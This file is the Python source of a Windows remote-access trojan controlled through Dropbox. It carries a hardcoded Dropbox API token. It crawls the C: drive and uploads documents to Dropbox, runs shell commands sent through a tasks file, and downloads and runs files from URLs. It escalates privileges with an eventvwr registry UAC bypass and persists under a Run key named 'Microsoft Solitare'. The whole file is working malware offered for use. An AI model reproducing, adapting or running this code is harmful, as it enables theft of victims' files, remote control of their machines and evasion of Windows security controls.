from winreg import *
from shutil import copyfile
import requests
import os
import dropbox
import time
import threading
import cmd
import platform
import json
import base64
import ctypes
import subprocess
import uuid
import sys
apiKey = "drxEmLRljpAAAAAAAAAADQfl_issiL1iWeiaLuHhdkwXsIhSkzEhDhoNkZJp3ev2"
# Create a dropbox object
dbx = dropbox.Dropbox(apiKey)
agentName = ""
tasks = {}
keyloggerStarted = False
completedTasks = []
eTotalFiles = 0
eTotalSize = 0

#-----------------EXFILTRATION----------------------------------------------
def upload(found_file, one_file):
    global exRename
    DBXpath = '/' + agentName + '/exfiled/' + one_file
    f = open(found_file, 'rb')
    try:
        dbx.files_upload(bytes(f.read()), DBXpath)
    except Exception as err:
        print (err)


def afterInfo():
    ext = (".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".zip")
    path = ('C:\\')
    for fileType in ext:
        try:
            for dirpath, dirname, files in os.walk(path):
                for one_file in files:
                    if one_file.endswith(ext):
                        a = ('$Recycle.Bin')
                        if a not in dirpath:
                            foundFile = os.path.join(dirpath, one_file)
                            upload(foundFile, one_file)
        except Exception as error:
            print(str(error))
            pass

def getInfo(ext):
    global eTotalFiles, eTotalSize
    path = ('C:\\')
    for dirpath, dirname, files in os.walk(path):
        for one_file in files:
            if one_file.endswith(ext):
                a = ('$Recycle.Bin')
                if a not in dirpath:
                    foundFile = os.path.join(dirpath, one_file)
                    eTotalSize = eTotalSize + (foundFile.__sizeof__())
                    eTotalFiles = eTotalFiles + 1

def exfilFiles():
    try:
        dbx.files_create_folder_v2('/%s/exfiled' % agentName)
    except Exception as e:
        print('Exfil folder already created')
        pass
   #Uncomment to get all these files (".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".zip")
    ext = (".pdf", ".doc")
    for fileType in ext:
        getInfo(fileType)

    exfilThread = threading.Thread(target=afterInfo, args=())
    exfilThread.daemon = True
    exfilThread.start()

    return ('''
    [+] Exfilling Data to Dropbox  [+] 
    -----------------------------------
    Total number of files: %s
    Total size: %sGB
    
    ''' % (eTotalFiles, eTotalSize/1e+6))
#---------------------END EXFILTRATION---------------------------------------

def executeBackground(command):
    subprocess.Popen([command.split()])
    return True

def ExecuteShellCommand(command):
    cm1 = command[0]
    data = ""
    try:
        p = subprocess.Popen(cm1, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for x in p.stdout:
            data +=  x.decode('utf-8')
    except Exception as err:
        pass
        data = err
    return data


def exec_bypassuac():
    if (ctypes.windll.shell32.IsUserAnAdmin()):
        data = "[+] Agent is running with Administrative Privileges [+]"
    else:
        keyVal = r'Software\Classes\mscfile\shell\open\command'
        try:
            key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        except:
            key = CreateKey(HKEY_CURRENT_USER, keyVal)
        SetValueEx(key, None, 0, REG_SZ, sys.executable)
        CloseKey(key)
        os.system("eventvwr")
        data = "[+] Task bypassuac Executed Successfuly [+]"
    return (str(data))


def exec_cmd(cmd):
    data = (ExecuteShellCommand(cmd.split()))
    return data


def exec_persist():
    data = ""
    filedrop = r'%s\Saved Games\%s' % (os.path.expandvars("%userprofile%"), 'sol.exe')
    currentExecutable = sys.executable
    try:
        copyfile(currentExecutable, filedrop)

        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key, "Microsoft Solitare", 0, REG_SZ, filedrop)
        CloseKey(key)
        data = "[+] Persistence Completed [+]"
    except Exception:
        pass
        data = "[-] Error while creating persistence [-]"

    return (str(data))


def exec_downloadexecute(url):
    try:
        r = requests.get(url)
        filename = url.split('/')[-1]

        if r.status_code == 200:
            f = open(filename, 'wb')
            f.write(r.content)
            f.close()
            executeBackground(filename)
            data = "[+] Task Completed Successfully [+]"
        else:
            data = "[-] Error [-]"
    except Exception as err:
        data = err
    return str(data)


def doTask(command, task):
    mode = (dropbox.files.WriteMode.overwrite)
    output = {}
    path = '/%s/output' % agentName
    try:
        _, res = dbx.files_download(path)
    except Exception:
        dbx.files_upload(json.dumps(output).encode('utf8'), path, mode)
        pass
        _, res = dbx.files_download(path)

    output = json.loads(res.text.replace('\n', ''))

    if (command.startswith('{SHELL}')):
        cmd = command.split('{SHELL}')[1]
        output[task] = {"OUTPUT": exec_cmd(cmd)}

    if (command.startswith('{DOWNLOAD}')):
        url = command.split('{DOWNLOAD}')[1]
        output[task] = {"OUTPUT": exec_downloadexecute(url)}

    elif (command == "exfil"):
        output[task] = {"OUTPUT": exfilFiles()}

    elif (command == "persist"):
        output[task] = {"OUTPUT": exec_persist()}

    elif (command == "bypassuac"):
        output[task] = {"OUTPUT": exec_bypassuac()}


    # Upload the output of commands
    print (output)
    try:
        dbx.files_upload(json.dumps(output).encode('utf-8'), path, mode)
        completedTasks.append(task)
    except Exception as err:
        print (err)
        time.sleep(25)
        pass


class agentNotifier(object):

    def __init__(self, interval=20):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = False
        thread.start()

    def run(self):
        while True:
            notify()
            time.sleep(self.interval)


class taskChecker(object):

    def __init__(self, interval=5):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = False
        thread.start()

    def run(self):
        while True:
            checkTasks()
            time.sleep(self.interval)


def checkTasks():
    global tasks
    path = '/%s/tasks' % agentName
    for file in dbx.files_list_folder('/%s/' % agentName).entries:
        if (file.name == 'tasks'):
            _, res = dbx.files_download(path)
            if (res.content != ""):
                tasks = json.loads(res.text.replace('\n', ''))
                for task, taskContent in tasks.items():
                    if (str(taskContent["STATUS"]) == "Completed"):
                        deleteOutputKey(task)
                    if (str(taskContent["STATUS"]) == "Waiting" and task not in completedTasks):
                        doTask(str(taskContent["COMMAND"]), task)


def dropboxFileExists(path, file):
    for fileName in dbx.files_list_folder(path).entries:
        if fileName.name == file:
            return True
    return False


def deleteOutputKey(taskname):
    path = '/%s/output' % agentName
    mode = (dropbox.files.WriteMode.overwrite)
    try:
        if (dropboxFileExists('/%s/' % agentName, 'output')):
            _, res = dbx.files_download(path)
            if (res.content != ""):
                outputData = json.loads(res.content.replace('\n', ''))
                del outputData[taskname]
            else:
                outputData = {}
            dbx.files_upload(json.dumps(outputData), path, mode)
    except Exception:
        pass


def notify():
    data = str(time.time())
    path = '/%s/lasttime' % agentName
    mode = (dropbox.files.WriteMode.add)
    for file in dbx.files_list_folder('/%s/' % agentName).entries:

        if (file.name == 'lasttime'):
            mode = (dropbox.files.WriteMode.overwrite)
            break
    try:
        dbx.files_upload(data, path, mode)
    except Exception:
        pass
        time.sleep(30)


def firstRun():
        try:
            setAgentName()
            dbx.files_create_folder('/%s' % agentName)
        except Exception as e:
            print ('Agent already infected')
            pass



def setAgentName():
    global agentName
    if (ctypes.windll.shell32.IsUserAnAdmin()):
        agentName = "%s-%s%s" % (platform.node(), str(uuid.getnode()), "SYS")
    else:
        agentName = "%s-%s" % (platform.node(), str(uuid.getnode()))


def main():
    firstRun()
    notifier = agentNotifier()
    taskchecker = taskChecker()


if __name__ == "__main__":
    main()